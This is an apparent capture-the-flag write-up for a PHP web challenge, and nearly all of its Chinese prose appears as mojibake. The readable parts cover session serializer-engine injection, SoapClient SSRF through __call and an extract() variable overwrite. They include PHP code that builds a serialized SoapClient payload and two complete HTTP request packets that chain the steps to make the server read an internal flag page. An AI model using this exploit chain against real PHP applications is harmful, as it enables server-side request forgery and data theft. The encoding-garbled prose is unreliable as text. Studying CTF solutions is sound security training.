<p>ä½†æ˜¯æˆ‘ä»¬ç›´æ¥é€šè¿‡xffä¿®æ”¹ipè·å–ä¸åˆ° è¿™é‡Œå°±å¾ˆåƒä¹‹å‰åšçš„ä¸€é“é¢˜ç›®</p>
<p>è¦é€šè¿‡ssrf æ‰“æ‰è¡Œ</p>
<p>æ¥åˆ†æä¸€ä¸‹index.php</p>
<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func()"></a>call_user_func()</h2><p>é¦–å…ˆæ˜¯ä¸€ä¸ªcall_user_func() ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°æ‰§è¡Œ ç¬¬äºŒä¸ªå‚æ•°ä½œä¸ºå›è°ƒå‡½æ•°çš„å‚æ•°ä¼ å…¥</p>
<p>ä½†æ˜¯è¿™é‡Œä¸€å¼€å§‹æˆ‘åœ¨æƒ³ä¸ºä»€ä¹ˆä¸ç›´æ¥é€šè¿‡system()å½“å›è°ƒå‡½æ•° ç›´æ¥è¿›è¡Œå‘½ä»¤æ‰§è¡Œ </p>
<p>åæ¥å‘ç°$_POSTåªèƒ½ä»¥é”®å€¼ ä¹Ÿå°±æ˜¯A=Bçš„å½¢å¼ä¼ å…¥æ‰è¡Œ </p>
<p>åªä¼ å…¥ä¸€ä¸ªAæ˜¯postä¸ä¸Šå»çš„ æ‰€ä»¥A=Bçš„å½¢å¼è‚¯å®šä¸ç¬¦åˆcall_user_func()ç¬¬äºŒä¸ªå‚æ•°æ— æœ</p>
<p>é™¤æ­¤ä¹‹å¤– è¿™ä¸ªå‡½æ•°ä¸ä»…ä»…åªèƒ½ä¼ å…¥å‡½æ•° è¿˜å¯ä»¥é€šè¿‡æ•°ç»„åŒ…å«ç±»çš„æ–¹å¼æ‰§è¡Œç±»çš„æ–¹æ³•</p>
<p>å¦‚ä¸‹ï¼š</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689863056915-faa2b80d-4893-41f9-afaa-78862cad8a45.png" alt="img"></p>
<p> æŠŠç¬¬ä¸€ä¸ªå€¼å½“ä½œç±»åï¼Œç¬¬äºŒä¸ªå€¼å½“ä½œæ–¹æ³•è¿›è¡Œå›è°ƒ</p>
<h2 id="php-sessionååºåˆ—åŒ–æœºåˆ¶"><a href="#php-sessionååºåˆ—åŒ–æœºåˆ¶" class="headerlink" title="php sessionååºåˆ—åŒ–æœºåˆ¶"></a>php sessionååºåˆ—åŒ–æœºåˆ¶</h2><p>å…¶æ¬¡æ˜¯php sessionååºåˆ—åŒ–æœºåˆ¶ <a target="_blank" rel="noopener" href="https://blog.spoock.com/2016/10/16/php-serialize-problem/">https://blog.spoock.com/2016/10/16/php-serialize-problem/</a> å…·ä½“å¯å‚è€ƒè¿™ä¸ªæ–‡ç«  è¿™ä¸ªå¸ˆå‚…å†™çš„å¾ˆè¯¦ç»†</p>
<p>ä¹‹å‰åœ¨ctfshow åˆ·é¢˜çš„æ—¶å€™ä¹Ÿé‡åˆ°äº†</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">session.serialize_handler   string --å®šä¹‰ç”¨æ¥åºåˆ—åŒ–/ååºåˆ—åŒ–çš„å¤„ç†å™¨åå­—ã€‚é»˜è®¤ä½¿ç”¨php</span><br></pre></td></tr></table></figure>

<p>session.serialize_handleræ˜¯ç”¨æ¥è®¾ç½®sessionçš„åºåˆ—è¯å¼•æ“çš„ï¼Œé™¤äº†é»˜è®¤çš„PHPå¼•æ“ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–å¼•æ“ï¼Œä¸åŒçš„å¼•æ“æ‰€å¯¹åº”çš„sessionçš„å­˜å‚¨æ–¹å¼ä¸ç›¸åŒã€‚  </p>
<p>ä¸€å…±æœ‰ä¸‰ç§</p>
<ul>
<li>php_binary:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®åçš„é•¿åº¦å¯¹åº”çš„ASCIIå­—ç¬¦+é”®å+ç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</li>
<li>php:å­˜å‚¨æ–¹å¼æ˜¯ï¼Œé”®å+ç«–çº¿+ç»è¿‡serialize()å‡½æ•°åºåˆ—å¤„ç†çš„å€¼</li>
<li>php_serialize(php&gt;5.5.4):å­˜å‚¨æ–¹å¼æ˜¯ï¼Œç»è¿‡serialize()å‡½æ•°åºåˆ—åŒ–å¤„ç†çš„å€¼</li>
</ul>
<p>å­˜å‚¨æœºåˆ¶ï¼š</p>
<p>phpä¸­çš„sessionä¸­çš„å†…å®¹å¹¶ä¸æ˜¯æ”¾åœ¨å†…å­˜ä¸­çš„ï¼Œè€Œæ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼æ¥å­˜å‚¨çš„ï¼Œå­˜å‚¨æ–¹å¼å°±æ˜¯ç”±é…ç½®é¡¹session.save_handleræ¥è¿›è¡Œç¡®å®šçš„ï¼Œé»˜è®¤æ˜¯ä»¥æ–‡ä»¶çš„æ–¹å¼å­˜å‚¨ã€‚<br>å­˜å‚¨çš„æ–‡ä»¶æ˜¯ä»¥sess_sessionidæ¥è¿›è¡Œå‘½åçš„ï¼Œæ–‡ä»¶çš„å†…å®¹å°±æ˜¯sessionå€¼çš„åºåˆ—è¯ä¹‹åçš„å†…å®¹ã€‚</p>
<p>å½“åºåˆ—åŒ–çš„å¼•æ“å’Œååºåˆ—åŒ–çš„å¼•æ“ä¸ä¸€è‡´æ—¶ï¼Œå°±å¯ä»¥åˆ©ç”¨å¼•æ“ä¹‹é—´çš„å·®å¼‚äº§ç”Ÿåºåˆ—åŒ–æ³¨å…¥æ¼æ´ã€‚  </p>
<p>ä¾‹å¦‚ä¼ å…¥<code>$_SESSION[&#39;name&#39;]=&#39;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&#39;;</code> </p>
<p>åºåˆ—åŒ–å¼•æ“ä½¿ç”¨çš„æ˜¯php_serializeï¼Œé‚£ä¹ˆå‚¨å­˜çš„sessionæ–‡ä»¶ä¸º</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;|O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;&quot;;&#125;</span><br></pre></td></tr></table></figure>

<p>è€Œååºåˆ—åŒ–å¼•æ“å¦‚æœä½¿ç”¨çš„æ˜¯phpï¼Œå°±ä¼šæŠŠ|ä½œä¸ºä½œä¸ºkeyå’Œvalueçš„åˆ†éš”ç¬¦ã€‚æŠŠ<code>a:1:&#123;s:4:&quot;name&quot;;s:5:&quot;</code>å½“ä½œé”®åï¼Œè€ŒæŠŠ<code>O:5:&quot;Smi1e&quot;:1:&#123;s:4:&quot;test&quot;;s:3:&quot;AAA&quot;;&#125;</code>å½“ä½œç»è¿‡serialize()å‡½æ•°å¤„ç†è¿‡çš„å€¼ï¼Œæœ€åä¼šæŠŠå®ƒè¿›è¡Œunserializeå¤„ç†ï¼Œæ­¤æ—¶å°±æ„æˆäº†ä¸€æ¬¡ååºåˆ—åŒ–æ³¨å…¥æ”»å‡»ã€‚  </p>
<h2 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h2><p>å†å°±æ˜¯åˆ°å¯ä»¥ssrfçš„ç±» ä¹‹å‰åˆ·ctfshowçš„é¢˜ç›®æ—¶å€™å°±é‡åˆ°æ›¾ç»ç”¨è¿‡è¿™ä¸ªç±» SoapClient  å®ƒå¯ä»¥å‘é€httpè¯·æ±‚åŒ…</p>
<p> åˆ©ç”¨phpåŸç”Ÿç±»SoapClientä¸­çš„__callæ–¹æ³•è¿›è¡ŒSSRF</p>
<p>åœ¨æ–°å»ºä¸€ä¸ª<strong>SoapClient</strong>çš„ç±»å¯¹è±¡çš„æ—¶å€™ï¼Œéœ€è¦æœ‰ä¸¤ä¸ªå‚æ•°ï¼Œä¸€ä¸ªæ˜¯å­—ç¬¦ä¸²å½¢å¼çš„<strong>wsdl</strong>ï¼Œå¦ä¸€ä¸ªæ˜¯æ•°ç»„å½¢å¼çš„<strong>options</strong>ã€‚è€Œ<strong>wsdl</strong>åœ¨å¼€å‘ä¸­ååˆ†å¸¸è§ï¼Œåœ¨å®‰å…¨ä¸­ç”¨çš„æ¯”è¾ƒå°‘ ï¼Œå¹¶ä¸”è¿™é‡Œä¹Ÿç”¨ä¸åˆ°ï¼Œæ‰€ä»¥è®¾ä¸ºnullå°±è¡Œäº†ã€‚</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689864728281-c032ebaf-c62c-4b99-835a-e88cdcfe9cc7.png" alt="img"></p>
<p>æ„é€ åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="string">&quot;http://127.0.0.1/flag.php&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="variable">$url</span>, <span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$url</span>));</span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;|&quot;</span> . <span class="title function_ invoke__">urlencode</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">|O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A36%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>style%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span><span class="keyword">use</span>%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A17%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>trace%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>compression%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A15%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>sdl%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>typemap%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>httpsocket%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>httpurl%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A18%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_login%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_password%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_use_digest%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A19%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_digest%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_proxy_host%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_proxy_port%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_proxy_login%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A27%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_proxy_password%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_exceptions%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_encoding%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_classmap%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A21%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_features%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A31%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_connection_timeout%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A27%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_stream_context%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_user_agent%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_keep_alive%<span class="number">22</span>%<span class="number">3</span>Bb%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A23%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_ssl_method%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A22%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_use_proxy%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A20%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>_cookies%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A0%<span class="number">3</span>A%<span class="number">7</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A29%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__default_headers%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A24%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__soap_fault%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A26%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__last_request%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A27%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__last_response%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A34%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__last_request_headers%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A35%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>SoapClient%<span class="number">00</span>__last_response_headers%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>è‡³äºè¿™ä¸€è¡Œ<code>$b = new SoapClient(null, array(&#39;uri&#39; =&gt; $url, &#39;location&#39; =&gt; $url));</code></p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689865079531-bdee449b-dea8-4904-858a-844632b40566.png" alt="img"></p>
<p>æœ¬é¢˜çš„æ€è·¯ï¼š</p>
<p>åˆ©ç”¨å›è°ƒå‡½æ•°è¦†ç›–sessionåºåˆ—åŒ–å¼•æ“ä¸ºphp_serilaze  åœ¨ä»£ç ä¸­è¿™æ ·<code>session_start(serialize_hander=php_serialize)</code>  å¯ä»¥æŸ¥phpæ‰‹å†Œèƒ½è¿™æ ·ä¿®æ”¹  ä¸€å¼€å§‹é—®gptè¯´ä¸èƒ½è¿™æ · ç€å®æ˜¯è¢«è¯¯å¯¼äº†</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689867197838-9f5e2a67-85ef-4ab1-80ab-409e4fab2459.png" alt="img"></p>
<p>æ„é€ SSRFçš„Soapç±»çš„åºåˆ—åŒ–å­—ç¬¦ä¸²é…åˆåºåˆ—åŒ–æ³¨å…¥å†™å…¥sessionæ–‡ä»¶ æ–‡ä»¶åè¦ç”¨phpsessid=8ä½è‡ªå·±è®¾ç½®ä¸€ä¸‹</p>
<p>åˆ©ç”¨å˜é‡è¦†ç›–æ¼æ´ï¼Œç”¨extract()è¦†ç›–æ‰å˜é‡bä¸ºå›è°ƒå‡½æ•°call_user_funcï¼Œå›è°ƒå‡½æ•°è°ƒç”¨Soapç±»çš„æœªçŸ¥æ–¹æ³•ï¼Œè§¦å‘__callæ–¹æ³•è¿›è¡ŒSSRFè®¿é—®flag.phpã€‚æŠŠflagå†™å…¥sessionï¼Œå†æŠŠsessionæ‰“å°å‡ºæ¥å³å¯ã€‚</p>
<p>è¯·æ±‚åŒ…ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?f=session_start&amp;name=|O%<span class="number">3</span>A10%<span class="number">3</span>A%<span class="number">22</span>SoapClient%<span class="number">22</span>%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>uri%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>location%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A25%<span class="number">3</span>A%<span class="number">22</span>http%<span class="number">3</span>A%<span class="number">2</span>F%<span class="number">2</span>F127.<span class="number">0.0</span>.<span class="number">1</span>%<span class="number">2</span>Fflag.php%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>_soap_version%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>B%<span class="number">7</span>D HTTP/<span class="number">1.1</span></span><br><span class="line">Host: b409417f-d781-<span class="number">4e26</span>-ae3a-<span class="number">96e176</span>b88d1a.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; PHPSESSID=aaaaaaaa</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 31</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">serialize_handler=php_serialize</span></span><br></pre></td></tr></table></figure>

<p>é¦–å…ˆå…ˆå°†phpåºåˆ—åŒ–å¼•æ“è®¾ç½®ä¸ºphp_serialize  å†™å…¥sessionæ–‡ä»¶  </p>
<p>æºç ä¸­session_start()ååºåˆ—åŒ–ä½¿ç”¨çš„æ˜¯phpå¼•æ“ </p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914183098-3d85e411-a2a5-4148-9710-278f7949f707.png" alt="img"></p>
<p>æ¥ä¸‹é‡Œæˆ‘ä»¬è¦†ç›–å˜é‡bï¼Œåˆ©ç”¨call_user_funcè°ƒç”¨SoapClientç±»ä¸­çš„ä¸å­˜åœ¨æ–¹æ³•ï¼Œè§¦å‘__callæ–¹æ³•ï¼Œæ‰§è¡Œssrfã€‚å¹¶è·å¾—è®¿é—®flag.phpçš„PHPSESSIDã€‚  </p>
<p> è¿™é‡Œçš„$aæ•°ç»„å°±æ˜¯array(â€œSoapClientâ€,â€welcome_to_the_lctf2018â€)</p>
<p>ä¹Ÿå°±æ˜¯<code>call_user_func(call_user_func(&quot;SoapClient&quot;,&quot;welcome_to_the_lctf2018&quot;))</code> å› ä¸ºSoapClientä¸å­˜åœ¨welcome_to_the_lctf2018æ–¹æ³• æ‰€ä»¥å°±è°ƒç”¨__callé­”æœ¯æ–¹æ³•äº†</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /?f=extract&amp;name=SoapClient HTTP/<span class="number">1.1</span></span><br><span class="line">Host: <span class="number">603457</span>b5-b6be-<span class="number">4</span>cdb-<span class="number">9</span>b14-ec8f4d39f71f.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">Cache-Control: max-age=<span class="number">0</span></span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64) AppleWebKit/<span class="number">537.36</span> (KHTML, like Gecko) Chrome/<span class="number">114.0</span>.<span class="number">0.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/avif,image/webp,image/apng,*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Cookie: __gads=ID=2a013f3dde9ad985-2254f58cafe700cf:T=1689741221:RT=1689742200:S=ALNI_Maqp-fX6ej98tcXJHWIvb4mWhQdSg; __gpi=UID=00000c2221d9f3e8:T=1689741221:RT=1689742200:S=ALNI_MZMzVabCNghJHJfa6k9qDxOuQgInA; PHPSESSID=66666666</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 16</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">b=call_user_func</span></span><br></pre></td></tr></table></figure>

<p>è¿™æ ·æ ¹æ®flag.php å°±ä¼šå°†flagå†™å…¥session</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914873442-69582790-3062-440f-850f-34d2eb748016.png" alt="img"></p>
<p>æ‰¾åˆ°phpsessid  </p>
<p>æœåŠ¡å™¨å¯ä»¥æ ¹æ®PHPSESSIDæ¥è¯†åˆ«ç”¨æˆ·session,è·å–ä¿å­˜åœ¨æœåŠ¡å™¨sessionæ–‡ä»¶ä¸­çš„ç›¸å…³æ•°æ®,å¦‚ç”¨æˆ·çŠ¶æ€ã€è´­ç‰©è½¦å†…å®¹ç­‰ã€‚  </p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914689440-f88fdcbe-0b73-4659-99df-fd94033ce083.png" alt="img"></p>
<p>ç„¶åå°†phpsessidæ”¹ä¸ºä¿å­˜flagçš„é‚£ä¸ªå°±å¯ä»¥äº†</p>
<p><img src="https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689914737673-48bf1329-9c2b-46d5-bdd8-0d533f171351.png" alt="img"></p>
<p>é‚£ä¹ˆä¸ºä»€ä¹ˆä¿®æ”¹phpsessidå°±èƒ½å¾—åˆ°flagé‚£ </p>
<p>æˆ‘æ˜¯è¿™ä¹ˆç†è§£çš„ï¼šæˆ‘ä»¬éƒ½çŸ¥é“sessionæ˜¯ä¿å­˜æˆ‘ä»¬ç™»å½•çŠ¶æ€çš„è¯†åˆ«èº«ä»½çš„ä¸œè¥¿ï¼Œæˆ‘ä»¬è®¿é—®flag.phpä»¥åå°†flagä¿å­˜åœ¨session[flag]ä¸­ æˆ‘ä»¬åªè¦å°†æˆ‘ä»¬èº«ä»½æ”¹ä¸ºè®¿é—®flag.phpé‚£ä¸ªèº«ä»½å°±è¡Œäº† ç„¶åindx.phpä¸­çš„<code>var_dump($_SESSION)</code>å°±ä¼šå°†flagè¾“å‡ºå‡ºæ¥</p>
